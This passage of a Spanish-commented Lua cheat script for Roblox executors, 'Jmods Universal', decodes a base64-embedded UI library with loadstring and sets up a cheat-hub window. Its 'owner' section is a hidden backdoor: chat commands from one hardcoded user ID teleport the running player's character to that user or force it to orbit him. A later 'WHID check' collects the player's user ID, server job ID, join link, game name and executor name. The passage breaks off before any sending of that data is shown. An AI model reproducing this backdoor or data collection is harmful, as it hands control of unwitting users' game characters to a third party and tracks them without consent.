NhdmVkLCBidXQgaWYgeW91IGNoYW5nZSB0aGUga2V5LCB0aGV5IHdpbGwgYmUgdW5hYmxlIHRvIHVzZSB5b3VyIHNjcmlwdAoJCQlHcmFiS2V5RnJvbVNpdGUgPSBmYWxzZSwgLS0gSWYgdGhpcyBpcyB0cnVlLCBzZXQgS2V5IGJlbG93IHRvIHRoZSBSQVcgc2l0ZSB5b3Ugd291bGQgbGlrZSBSYXlmaWVsZCB0byBnZXQgdGhlIGtleSBmcm9tCgkJCUtleSA9IHsiSGVsbG8ifSAtLSBMaXN0IG9mIGtleXMgdGhhdCB3aWxsIGJlIGFjY2VwdGVkIGJ5IHRoZSBzeXN0ZW0sIGNhbiBiZSBSQVcgZmlsZSBsaW5rcyAocGFzdGViaW4sIGdpdGh1YiBldGMpIG9yIHNpbXBsZSBzdHJpbmdzICgiaGVsbG8iLCJrZXkyMiIpCgkJfQoJfSkKCglsb2NhbCBUYWIgPSBXaW5kb3c6Q3JlYXRlVGFiKCJUYWIgRXhhbXBsZSIsICdrZXktcm91bmQnKSAtLSBUaXRsZSwgSW1hZ2UKCWxvY2FsIFRhYjIgPSBXaW5kb3c6Q3JlYXRlVGFiKCJUYWIgRXhhbXBsZSAyIiwgNDQ4MzM2MjQ1OCkgLS0gVGl0bGUsIEltYWdlCgoJbG9jYWwgU2VjdGlvbiA9IFRhYjI6Q3JlYXRlU2VjdGlvbigiU2VjdGlvbiIpCgoKCWxvY2FsIENvbG9yUGlja2VyID0gVGFiMjpDcmVhdGVDb2xvclBpY2tlcih7CgkJTmFtZSA9ICJDb2xvciBQaWNrZXIiLAoJCUNvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LDI1NSwyNTUpLAoJCUZsYWcgPSAiQ29sb3JQaWNmc2Vma2VyMSIsIC0tIEEgZmxhZyBpcyB0aGUgaWRlbnRpZmllciBmb3IgdGhlIGNvbmZpZ3VyYXRpb24gZmlsZSwgbWFrZSBzdXJlIGV2ZXJ5IGVsZW1lbnQgaGFzIGEgZGlmZmVyZW50IGZsYWcgaWYgeW91J3JlIHVzaW5nIGNvbmZpZ3VyYXRpb24gc2F2aW5nIHRvIGVuc3VyZSBubyBvdmVybGFwcwoJCUNhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCgkJCS0tIFRoZSBmdW5jdGlvbiB0aGF0IHRha2VzIHBsYWNlIGV2ZXJ5IHRpbWUgdGhlIGNvbG9yIHBpY2tlciBpcyBtb3ZlZC9jaGFuZ2VkCgkJCS0tIFRoZSB2YXJpYWJsZSAoVmFsdWUpIGlzIGEgQ29sb3IzZnJvbVJHQiB2YWx1ZSBiYXNlZCBvbiB3aGljaCBjb2xvciBpcyBzZWxlY3RlZAoJCWVuZAoJfSkKCglsb2NhbCBTbGlkZXIgPSBUYWIyOkNyZWF0ZVNsaWRlcih7CgkJTmFtZSA9ICJTbGlkZXIgRXhhbXBsZSIsCgkJUmFuZ2UgPSB7MCwgMTAwfSwKCQlJbmNyZW1lbnQgPSAxMCwKCQlTdWZmaXggPSAiQmFuYW5hcyIsCgkJQ3VycmVudFZhbHVlID0gNDAsCgkJRmxhZyA9ICJTbGlkZWZlZnNyMSIsIC0tIEEgZmxhZyBpcyB0aGUgaWRlbnRpZmllciBmb3IgdGhlIGNvbmZpZ3VyYXRpb24gZmlsZSwgbWFrZSBzdXJlIGV2ZXJ5IGVsZW1lbnQgaGFzIGEgZGlmZmVyZW50IGZsYWcgaWYgeW91J3JlIHVzaW5nIGNvbmZpZ3VyYXRpb24gc2F2aW5nIHRvIGVuc3VyZSBubyBvdmVybGFwcwoJCUNhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCgkJCS0tIFRoZSBmdW5jdGlvbiB0aGF0IHRha2VzIHBsYWNlIHdoZW4gdGhlIHNsaWRlciBjaGFuZ2VzCgkJCS0tIFRoZSB2YXJpYWJsZSAoVmFsdWUpIGlzIGEgbnVtYmVyIHdoaWNoIGNvcnJlbGF0ZXMgdG8gdGhlIHZhbHVlIHRoZSBzbGlkZXIgaXMgY3VycmVudGx5IGF0CgkJZW5kLAoJfSkKCglsb2NhbCBJbnB1dCA9IFRhYjI6Q3JlYXRlSW5wdXQoewoJCU5hbWUgPSAiSW5wdXQgRXhhbXBsZSIsCgkJQ3VycmVudFZhbHVlID0gJycsCgkJUGxhY2Vob2xkZXJUZXh0ID0gIklucHV0IFBsYWNlaG9sZGVyIiwKCQlGbGFnID0gJ2Rhd2Rhd2QnLAoJCVJlbW92ZVRleHRBZnRlckZvY3VzTG9zdCA9IGZhbHNlLAoJCUNhbGxiYWNrID0gZnVuY3Rpb24oVGV4dCkKCQkJLS0gVGhlIGZ1bmN0aW9uIHRoYXQgdGFrZXMgcGxhY2Ugd2hlbiB0aGUgaW5wdXQgaXMgY2hhbmdlZAoJCQktLSBUaGUgdmFyaWFibGUgKFRleHQpIGlzIGEgc3RyaW5nIGZvciB0aGUgdmFsdWUgaW4gdGhlIHRleHQgYm94CgkJZW5kLAoJfSkKCgoJLS1SYXlmaWVsZExpYnJhcnk6Tm90aWZ5KHtUaXRsZSA9ICJSYXlmaWVsZCBJbnRlcmZhY2UiLCBDb250ZW50ID0gIldlbGNvbWUgdG8gUmF5ZmllbGQuIFRoZXNlIC0gYXJlIHRoZSBicmFuZCBuZXcgbm90aWZpY2F0aW9uIGRlc2lnbiBmb3IgUmF5ZmllbGQsIHdpdGggY3VzdG9tIHNpemluZyBhbmQgUmF5ZmllbGQgY2FsY3VsYXRlZCB3YWl0IHRpbWVzLiIsIEltYWdlID0gNDQ4MzM2MjQ1OH0pCgoJbG9jYWwgU2VjdGlvbiA9IFRhYjpDcmVhdGVTZWN0aW9uKCJTZWN0aW9uIEV4YW1wbGUiKQoKCWxvY2FsIEJ1dHRvbiA9IFRhYjpDcmVhdGVCdXR0b24oewoJCU5hbWUgPSAiQ2hhbmdlIFRoZW1lIiwKCQlDYWxsYmFjayA9IGZ1bmN0aW9uKCkKCQkJLS0gVGhlIGZ1bmN0aW9uIHRoYXQgdGFrZXMgcGxhY2Ugd2hlbiB0aGUgYnV0dG9uIGlzIHByZXNzZWQKCQkJV2luZG93Lk1vZGlmeVRoZW1lKCdEYXJrQmx1ZScpCgkJZW5kLAoJfSkKCglsb2NhbCBUb2dnbGUgPSBUYWI6Q3JlYXRlVG9nZ2xlKHsKCQlOYW1lID0gIlRvZ2dsZSBFeGFtcGxlIiwKCQlDdXJyZW50VmFsdWUgPSBmYWxzZSwKCQlGbGFnID0gIlRvZ2dsZTFhZHdhd2QiLCAtLSBBIGZsYWcgaXMgdGhlIGlkZW50aWZpZXIgZm9yIHRoZSBjb25maWd1cmF0aW9uIGZpbGUsIG1ha2Ugc3VyZSBldmVyeSBlbGVtZW50IGhhcyBhIGRpZmZlcmVudCBmbGFnIGlmIHlvdSdyZSB1c2luZyBjb25maWd1cmF0aW9uIHNhdmluZyB0byBlbnN1cmUgbm8gb3ZlcmxhcHMKCQlDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQoJCQktLSBUaGUgZnVuY3Rpb24gdGhhdCB0YWtlcyBwbGFjZSB3aGVuIHRoZSB0b2dnbGUgaXMgcHJlc3NlZAoJCQktLSBUaGUgdmFyaWFibGUgKFZhbHVlKSBpcyBhIGJvb2xlYW4gb24gd2hldGhlciB0aGUgdG9nZ2xlIGlzIHRydWUgb3IgZmFsc2UKCQllbmQsCgl9KQoKCWxvY2FsIENvbG9yUGlja2VyID0gVGFiOkNyZWF0ZUNvbG9yUGlja2VyKHsKCQlOYW1lID0gIkNvbG9yIFBpY2tlciIsCgkJQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsMjU1LDI1NSksCgkJRmxhZyA9ICJDb2xvclBpY2tlcjFhd2QiLCAtLSBBIGZsYWcgaXMgdGhlIGlkZW50aWZpZXIgZm9yIHRoZSBjb25maWd1cmF0aW9uIGZpbGUsIG1ha2Ugc3VyZSBldmVyeSBlbGVtZW50IGhhcyBhIGRpZmZlcmVudCBmbGFnIGlmIHlvdSdyZSB1c2luZyBjb25maWd1cmF0aW9uIHNhdmluZyB0byBlbnN1cmUgbm8gb3ZlcmxhcHMKCQlDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQoJCQktLSBUaGUgZnVuY3Rpb24gdGhhdCB0YWtlcyBwbGFjZSBldmVyeSB0aW1lIHRoZSBjb2xvciBwaWNrZXIgaXMgbW92ZWQvY2hhbmdlZAoJCQktLSBUaGUgdmFyaWFibGUgKFZhbHVlKSBpcyBhIENvbG9yM2Zyb21SR0IgdmFsdWUgYmFzZWQgb24gd2hpY2ggY29sb3IgaXMgc2VsZWN0ZWQKCQllbmQKCX0pCgoJbG9jYWwgU2xpZGVyID0gVGFiOkNyZWF0ZVNsaWRlcih7CgkJTmFtZSA9ICJTbGlkZXIgRXhhbXBsZSIsCgkJUmFuZ2UgPSB7MCwgMTAwfSwKCQlJbmNyZW1lbnQgPSAxMCwKCQlTdWZmaXggPSAiQmFuYW5hcyIsCgkJQ3VycmVudFZhbHVlID0gNDAsCgkJRmxhZyA9ICJTbGlkZXIxZGF3ZCIsIC0tIEEgZmxhZyBpcyB0aGUgaWRlbnRpZmllciBmb3IgdGhlIGNvbmZpZ3VyYXRpb24gZmlsZSwgbWFrZSBzdXJlIGV2ZXJ5IGVsZW1lbnQgaGFzIGEgZGlmZmVyZW50IGZsYWcgaWYgeW91J3JlIHVzaW5nIGNvbmZpZ3VyYXRpb24gc2F2aW5nIHRvIGVuc3VyZSBubyBvdmVybGFwcwoJCUNhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCgkJCS0tIFRoZSBmdW5jdGlvbiB0aGF0IHRha2VzIHBsYWNlIHdoZW4gdGhlIHNsaWRlciBjaGFuZ2VzCgkJCS0tIFRoZSB2YXJpYWJsZSAoVmFsdWUpIGlzIGEgbnVtYmVyIHdoaWNoIGNvcnJlbGF0ZXMgdG8gdGhlIHZhbHVlIHRoZSBzbGlkZXIgaXMgY3VycmVudGx5IGF0CgkJZW5kLAoJfSkKCglsb2NhbCBJbnB1dCA9IFRhYjpDcmVhdGVJbnB1dCh7CgkJTmFtZSA9ICJJbnB1dCBFeGFtcGxlIiwKCQlDdXJyZW50VmFsdWUgPSAiSGVsbyIsCgkJUGxhY2Vob2xkZXJUZXh0ID0gIkFkYXB0aXZlIElucHV0IiwKCQlSZW1vdmVUZXh0QWZ0ZXJGb2N1c0xvc3QgPSBmYWxzZSwKCQlGbGFnID0gJ0lucHV0MScsCgkJQ2FsbGJhY2sgPSBmdW5jdGlvbihUZXh0KQoJCQktLSBUaGUgZnVuY3Rpb24gdGhhdCB0YWtlcyBwbGFjZSB3aGVuIHRoZSBpbnB1dCBpcyBjaGFuZ2VkCgkJCS0tIFRoZSB2YXJpYWJsZSAoVGV4dCkgaXMgYSBzdHJpbmcgZm9yIHRoZSB2YWx1ZSBpbiB0aGUgdGV4dCBib3gKCQllbmQsCgl9KQoKCWxvY2FsIHRob3B0aW9ucyA9IHt9Cglmb3IgdGhlbWVuYW1lLCB0aGVtZSBpbiBwYWlycyhSYXlmaWVsZExpYnJhcnkuVGhlbWUpIGRvCgkJdGFibGUuaW5zZXJ0KHRob3B0aW9ucywgdGhlbWVuYW1lKQoJZW5kCgoJbG9jYWwgRHJvcGRvd24gPSBUYWI6Q3JlYXRlRHJvcGRvd24oewoJCU5hbWUgPSAiVGhlbWUiLAoJCU9wdGlvbnMgPSB0aG9wdGlvbnMsCgkJQ3VycmVudE9wdGlvbiA9IHsiRGVmYXVsdCJ9LAoJCU11bHRpcGxlT3B0aW9ucyA9IGZhbHNlLAoJCUZsYWcgPSAiRHJvcGRvd24xIiwgLS0gQSBmbGFnIGlzIHRoZSBpZGVudGlmaWVyIGZvciB0aGUgY29uZmlndXJhdGlvbiBmaWxlLCBtYWtlIHN1cmUgZXZlcnkgZWxlbWVudCBoYXMgYSBkaWZmZXJlbnQgZmxhZyBpZiB5b3UncmUgdXNpbmcgY29uZmlndXJhdGlvbiBzYXZpbmcgdG8gZW5zdXJlIG5vIG92ZXJsYXBzCgkJQ2FsbGJhY2sgPSBmdW5jdGlvbihPcHRpb25zKQoJCQktLVdpbmRvdy5Nb2RpZnlUaGVtZShPcHRpb25zWzFdKQoJCQktLSBUaGUgZnVuY3Rpb24gdGhhdCB0YWtlcyBwbGFjZSB3aGVuIHRoZSBzZWxlY3RlZCBvcHRpb24gaXMgY2hhbmdlZAoJCQktLSBUaGUgdmFyaWFibGUgKE9wdGlvbnMpIGlzIGEgdGFibGUgb2Ygc3RyaW5ncyBmb3IgdGhlIGN1cnJlbnQgc2VsZWN0ZWQgb3B0aW9ucwoJCWVuZCwKCX0pCgoKCS0tV2luZG93Lk1vZGlmeVRoZW1lKHsKCS0tCVRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDUwLCA1NSwgNjApLAoJLS0JQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDI0MCwgMjQ1LCAyNTApLAoJLS0JVG9wYmFyID0gQ29sb3IzLmZyb21SR0IoMjE1LCAyMjUsIDIzNSksCgktLQlTaGFkb3cgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIxMCwgMjIwKSwKCgktLQlOb3RpZmljYXRpb25CYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjEwLCAyMjAsIDIzMCksCgktLQlOb3RpZmljYXRpb25BY3Rpb25zQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDIyNSwgMjMwLCAyNDApLAoKCS0tCVRhYkJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIxMCwgMjIwKSwKCS0tCVRhYlN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDE4MCwgMTkwLCAyMDApLAoJLS0JVGFiQmFja2dyb3VuZFNlbGVjdGVkID0gQ29sb3IzLmZyb21SR0IoMTc1LCAxODUsIDIwMCksCgktLQlUYWJUZXh0Q29sb3IgPSBDb2xvcjMuZnJvbVJHQig1MCwgNTUsIDYwKSwKCS0tCVNlbGVjdGVkVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMzAsIDM1LCA0MCksCgoJLS0JRWxlbWVudEJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyMTAsIDIyMCwgMjMwKSwKCS0tCUVsZW1lbnRCYWNrZ3JvdW5kSG92ZXIgPSBDb2xvcjMuZnJvbVJHQigyMjAsIDIzMCwgMjQwKSwKCS0tCVNlY29uZGFyeUVsZW1lbnRCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMTAsIDIyMCksCgktLQlFbGVtZW50U3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTkwLCAyMDAsIDIxMCksCgktLQlTZWNvbmRhcnlFbGVtZW50U3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTgwLCAxOTAsIDIwMCksCgoJLS0JU2xpZGVyQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjIwLCAyMzUpLCAgLS0gTGlnaHRlciBzaGFkZQoJLS0JU2xpZGVyUHJvZ3Jlc3MgPSBDb2xvcjMuZnJvbVJHQig3MCwgMTMwLCAxODApLAoJLS0JU2xpZGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTUwLCAxODAsIDIyMCksCgoJLS0JVG9nZ2xlQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDIxMCwgMjIwLCAyMzApLAoJLS0JVG9nZ2xlRW5hYmxlZCA9IENvbG9yMy5mcm9tUkdCKDcwLCAxNjAsIDIxMCksCgktLQlUb2dnbGVEaXNhYmxlZCA9IENvbG9yMy5mcm9tUkdCKDE4MCwgMTgwLCAxODApLAoJLS0JVG9nZ2xlRW5hYmxlZFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDYwLCAxNTAsIDIwMCksCgktLQlUb2dnbGVEaXNhYmxlZFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDE0MCwgMTQwLCAxNDApLAoJLS0JVG9nZ2xlRW5hYmxlZE91dGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTAwLCAxMjAsIDE0MCksCgktLQlUb2dnbGVEaXNhYmxlZE91dGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTIwLCAxMjAsIDEzMCksCgoJLS0JRHJvcGRvd25TZWxlY3RlZCA9IENvbG9yMy5mcm9tUkdCKDIyMCwgMjMwLCAyNDApLAoJLS0JRHJvcGRvd25VbnNlbGVjdGVkID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMTAsIDIyMCksCgoJLS0JSW5wdXRCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjIwLCAyMzAsIDI0MCksCgktLQlJbnB1dFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDE4MCwgMTkwLCAyMDApLAoJLS0JUGxhY2Vob2xkZXJDb2xvciA9IENvbG9yMy5mcm9tUkdCKDE1MCwgMTUwLCAxNTApCgktLX0pCgoJbG9jYWwgS2V5YmluZCA9IFRhYjpDcmVhdGVLZXliaW5kKHsKCQlOYW1lID0gIktleWJpbmQgRXhhbXBsZSIsCgkJQ3VycmVudEtleWJpbmQgPSAiUSIsCgkJSG9sZFRvSW50ZXJhY3QgPSBmYWxzZSwKCQlGbGFnID0gIktleWJpbmQxIiwgLS0gQSBmbGFnIGlzIHRoZSBpZGVudGlmaWVyIGZvciB0aGUgY29uZmlndXJhdGlvbiBmaWxlLCBtYWtlIHN1cmUgZXZlcnkgZWxlbWVudCBoYXMgYSBkaWZmZXJlbnQgZmxhZyBpZiB5b3UncmUgdXNpbmcgY29uZmlndXJhdGlvbiBzYXZpbmcgdG8gZW5zdXJlIG5vIG92ZXJsYXBzCgkJQ2FsbGJhY2sgPSBmdW5jdGlvbihLZXliaW5kKQoJCQktLSBUaGUgZnVuY3Rpb24gdGhhdCB0YWtlcyBwbGFjZSB3aGVuIHRoZSBrZXliaW5kIGlzIHByZXNzZWQKCQkJLS0gVGhlIHZhcmlhYmxlIChLZXliaW5kKSBpcyBhIGJvb2xlYW4gZm9yIHdoZXRoZXIgdGhlIGtleWJpbmQgaXMgYmVpbmcgaGVsZCBvciBub3QgKEhvbGRUb0ludGVyYWN0IG5lZWRzIHRvIGJlIHRydWUpCgkJZW5kLAoJfSkKCglsb2NhbCBMYWJlbCA9IFRhYjpDcmVhdGVMYWJlbCgiTGFiZWwgRXhhbXBsZSIpCgoJbG9jYWwgTGFiZWwyID0gVGFiOkNyZWF0ZUxhYmVsKCJXYXJuaW5nIiwgNDQ4MzM2MjQ1OCwgQ29sb3IzLmZyb21SR0IoMjU1LCAxNTksIDQ5KSwgIHRydWUpCgoJbG9jYWwgUGFyYWdyYXBoID0gVGFiOkNyZWF0ZVBhcmFncmFwaCh7VGl0bGUgPSAiUGFyYWdyYXBoIEV4YW1wbGUiLCBDb250ZW50ID0gIlBhcmFncmFwaCBFeGFtcGxlUGFyYWdyYXBoIEV4YW1wbGVQYXJhZ3JhcGggRXhhbXBsZVBhcmFncmFwaCBFeGFtcGxlUGFyYWdyYXBoIEV4YW1wbGVQYXJhZ3JhcGggRXhhbXBsZVBhcmFncmFwaCBFeGFtcGxlUGFyYWdyYXBoIEV4YW1wbGVQYXJhZ3JhcGggRXhhbXBsZVBhcmFncmFwaCBFeGFtcGxlUGFyYWdyYXBoIEV4YW1wbGVQYXJhZ3JhcGggRXhhbXBsZVBhcmFncmFwaCBFeGFtcGxlUGFyYWdyYXBoIEV4YW1wbGUifSkKZW5kCgppZiBDRW5hYmxlZCBhbmQgTWFpbjpGaW5kRmlyc3RDaGlsZCgnTm90aWNlJykgdGhlbgoJTWFpbi5Ob3RpY2UuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCU1haW4uTm90aWNlLlRpdGxlLlRleHRUcmFuc3BhcmVuY3kgPSAxCglNYWluLk5vdGljZS5TaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApCglNYWluLk5vdGljZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAsIC0xMDApCglNYWluLk5vdGljZS5WaXNpYmxlID0gdHJ1ZQoKCglUd2VlblNlcnZpY2U6Q3JlYXRlKE1haW4uTm90aWNlLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uSW5PdXQpLCB7U2l6ZSA9IFVEaW0yLm5ldygwLCAyODAsIDAsIDM1KSwgUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLCAtNTApLCBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC41fSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKE1haW4uTm90aWNlLlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMC4xfSk6UGxheSgpCmVuZAoKLS0gaWYgbm90IHVzZVN0dWRpbyB0aGVuCi0tIAl0YXNrLnNwYXduKGxvYWRXaXRoVGltZW91dCwgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TaXJpdXNTb2Z0d2FyZUx0ZC9TaXJpdXMvcmVmcy9oZWFkcy9yZXF1ZXN0L2Jvb3N0Lmx1YSIpCi0tIGVuZAoKdGFzay5kZWxheSg0LCBmdW5jdGlvbigpCglSYXlmaWVsZExpYnJhcnkuTG9hZENvbmZpZ3VyYXRpb24oKQoJaWYgTWFpbjpGaW5kRmlyc3RDaGlsZCgnTm90aWNlJykgYW5kIE1haW4uTm90aWNlLlZpc2libGUgdGhlbgoJCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5Ob3RpY2UsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5Jbk91dCksIHtTaXplID0gVURpbTIubmV3KDAsIDEwMCwgMCwgMjUpLCBQb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAsIC0xMDApLCBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5Ob3RpY2UuVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgoJCXRhc2sud2FpdCgwLjUpCgkJTWFpbi5Ob3RpY2UuVmlzaWJsZSA9IGZhbHNlCgllbmQKZW5kKQoKcmV0dXJuIFJheWZpZWxkTGlicmFyeQ==
]]

-- Cargar Rayfield desde Base64
local Rayfield = loadstring(base64decode(encodedRayfield))()


_G.Rayfield = Rayfield
-- Crear ventana
local Window = Rayfield:CreateWindow({
    Name = "Jmods Universal",
    Icon = 127271155083726,
    LoadingTitle = "Jmods Universal",
    LoadingSubtitle = "joao_mods",
    Theme = "Bloom",
    DisableRayfieldPrompts = true,
    DisableBuildWarnings = false,
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "JmodsUniversal",
        FileName = "joao_mods"
    },
    Discord = {
        Enabled = true,
        Invite = "4gGUz2tk",
        RememberJoins = false
    },
    KeySystem = false,
    KeySettings = {
        Title = "Jmods Universal",
        Subtitle = "Mantenimiento",
Note = "Falta poco. Más info en mi Discord: discord.gg/4bzTyQBBnt",
        FileName = "key",
        SaveKey = false,
        GrabKeyFromSite = false,
        Key = {"keymanxd"}
    }
})




-------Wea de owner




task.spawn(function()
    repeat task.wait() until game:IsLoaded()

    -- Variables globales
    local LocalPlayer = game.Players.LocalPlayer
    local ownerId = 4591285210
    local Orbiting = false
    local RunService = game:GetService("RunService")

    -- Función para teletransportar al Owner
    local function TeleportToOwner()
        local owner = game.Players:GetPlayerByUserId(ownerId)
        if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
            local ownerPos = owner.Character.HumanoidRootPart.Position
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(ownerPos + Vector3.new(0, 6, 0))
            end
        end
    end

    -- Función para iniciar la rotación alrededor del Owner
    local function StartOrbit()
        if LocalPlayer.UserId == ownerId or Orbiting then return end

        Orbiting = true

        RunService:BindToRenderStep("OrbitAroundOwner", Enum.RenderPriority.Character.Value, function()
            if not Orbiting then
                RunService:UnbindFromRenderStep("OrbitAroundOwner")
                return
            end
            local owner = game.Players:GetPlayerByUserId(ownerId)
            if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") and
               LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local time = tick()
                local radius = 10
                local speed = 2

                local x = math.cos(time * speed) * radius
                local z = math.sin(time * speed) * radius

                local ownerPos = owner.Character.HumanoidRootPart.Position
                local newPos = ownerPos + Vector3.new(x, 3, z)

                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(newPos, ownerPos)
            end
        end)
    end

    -- Función para detener la rotación
    local function StopOrbit()
        Orbiting = false
        RunService:UnbindFromRenderStep("OrbitAroundOwner")
    end

    -- Función para manejar comandos del Owner
    local function OwnerChatHandler(message)
        local msg = message:lower()
        if msg == ".t" then
            TeleportToOwner()
        elseif msg == ".u" then
            StartOrbit()
        elseif msg == ".uu" then
            StopOrbit()
        end
    end

    -- Función para verificar y conectar a los dueños
    local function CheckAndConnectPlayers()
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player.UserId == ownerId and not player:FindFirstChild("__JmodsConnected") then
                local marker = Instance.new("BoolValue")
                marker.Name = "__JmodsConnected"
                marker.Parent = player
                player.Chatted:Connect(OwnerChatHandler)
            end
        end
    end

    -- Conectar al entrar jugadores
    game.Players.PlayerAdded:Connect(function(player)
        task.wait(0.5)  -- Menor espera para reducir impacto
        if player.UserId == ownerId then
            CheckAndConnectPlayers()
        end
    end)

    -- Chequeo inicial
    CheckAndConnectPlayers()
end)








-- FUNCIONES DE TEMA
local themeSavePath = "JmodsUniversal/SelectedTheme.txt"

-- Guardar el tema
local function SaveTheme(themeName)
    if not isfile(themeSavePath) then
        makefolder("JmodsUniversal")
    end
    writefile(themeSavePath, themeName)

end

-- Cargar el tema guardado
local function LoadSavedTheme()
    local validThemes = {
        ["Light"] = true,
        ["Dark"] = true,
        ["Aqua"] = true,
        ["Jester"] = true,
        ["Moon"] = true,
        ["Synapse"] = true,
        ["Sentinel"] = true,
        ["Midnight"] = true,
        ["Serpent"] = true,
        ["Bloom"] = true,
        ["Discord"] = true,
        ["Default"] = true, -- Asegúrate de que todos los temas sean válidos
        ["AmberGlow"] = true,
        ["Amethyst"] = true,
        ["DarkBlue"] = true,
        ["Green"] = true,
        ["Ocean"] = true,
        ["Serenity"] = true,
    }

    if isfile(themeSavePath) then
        local theme = readfile(themeSavePath)

        if validThemes[theme] then

            Window.ModifyTheme(theme)
        else
            warn("Tema inválido:", theme)
            Window.ModifyTheme("Bloom")  -- Tema por defecto
        end
    else
        print("No se encontró el archivo de tema, cargando el predeterminado...")
        Window.ModifyTheme("Bloom")  -- Tema por defecto
    end
end

-- Cargar tema guardado al inicio
LoadSavedTheme()













-- [[ Notificación + WHID Check - Jmods Universal ]] --

-- [[ Notificación + WHID Check - Jmods Universal ]] --

task.delay(0.3, function()
    local success, err = pcall(function()
        local HttpService = game:GetService("HttpService")
        local CoreGui = game:GetService("CoreGui")
        local player = game.Players.LocalPlayer
        local placeName = "Juego desconocido"
        local ejecutador = "Desconocido"
        local jobId = game.JobId
        local userId = player.UserId
        local whid = tostring(userId) .. "-" .. string.sub(jobId, 1, 8)

        -- Lista de WHIDs bloqueados directamente en el script
        local blockedWHIDs = {
            [""] = true,
            [""] = true,
        }

        if blockedWHIDs[whid] then
            warn("WHID bloqueado: " .. whid)
            local hiddenUI = CoreGui:FindFirstChild("HiddenUI")
            if hiddenUI then
                hiddenUI:Destroy()
            end
            return
        end

        local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
        local webLink = "https://www.roblox.com/games/" .. game.PlaceId

        pcall(function()
            placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        end)

        pcall(function()
            ejecutador = identifyexecutor and identifyexecutor() or (getexecutorname and getexecutorname()) or "Otro"
        end)

        -- Mapeo de códigos de país a nombres completos
        local countryNames = {
            AF = "Afganistán", AL = "Albania", DZ = "Argelia", AD = "Andorra", AO = "Angola",
            AR = "Argentina", AM = "Armenia", AU = "Australia", AT = "Austria", AZ = "Azerbaiyán",
            BS = "Bahamas", BD = "Bangladés", BE = "Bélgica", BO = "Bolivia", BR = "Brasil",
            BG = "Bulgaria", CA = "Canadá", CL = "Chile", CN = "China", CO = "Colombia",
            CR = "Costa Rica", HR = "Croacia", CU = "Cuba", CZ = "Chequia", DK = "Dinamarca",
            DO = "República Dominicana", EC = "Ecuador", EG = "Egipto", SV = "El Salvador",
            EE = "Estonia", FI = "Finlandia", FR = "Francia", GE = "Georgia", DE = "Alemania",
            GR = "Grecia", GT = "Guatemala", HN = "Honduras", HU = "Hungría", IS = "Islandia",
            IN = "India", ID = "Indonesia", IR = "Irán", IE = "Irlanda", IL = "Israel",
            IT = "Italia", JP = "Japón", KZ = "Kazajistán", KR = "Corea del Sur", MX = "México",
